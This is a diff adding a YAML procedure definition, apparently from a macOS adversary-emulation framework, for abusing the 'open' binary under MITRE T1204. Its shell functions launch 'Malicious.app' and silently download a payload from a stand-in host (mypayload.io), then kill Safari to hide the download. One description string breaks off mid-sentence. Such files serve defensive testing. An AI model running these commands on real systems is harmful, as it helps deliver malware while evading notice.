@@ -1,0 +1,63 @@
+procedure_name: open
+tactic: Execution
+ttp_id: T1204
+guid: 62622417-c1c0-47b5-a6f2-6936f9e5be7d
+intent: Open files, folders, apps, URLs, and header files. Sourced from LOOBins; confirm
+  MITRE mapping for each enabled option.
+author: Brendan Chamberlain (@infosecb)
+created: '2023-05-10'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection: []
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1204/
+  description: "MITRE ATT&CK \u2014 T1204"
+- link: ''
+  description: ''
+- link: https://scriptingosx.com/2017/02/the-macos-open-command/
+  description: The macOS open Command
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --open-a-malicious-file
+    description: The open command can be used to open a malicious macOS app from the
+      terminal.
+    execute_function:
+    - execute_open_malicious_file
+  - option: --download-a-malicious-file
+    description: 'The following command downloads the payload.zip file in the default
+      browser (Safari) and then kills '
+    execute_function:
+    - execute_download_malicious_file
+  global_variable:
+  - name: CMD_OPEN
+    type: string
+    default_value: /usr/bin/open
+  functions:
+  - name: execute_open_malicious_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_open_malicious_file() {\n    local result\n    result=$(open Malicious.app\
+      \ 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_download_malicious_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_download_malicious_file() {\n    local result\n    result=$(open\
+      \ -g https://mypayload.io/payload.zip; sleep 3; killall Safari 2>&1)\n    $CMD_PRINTF\
+      \ \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
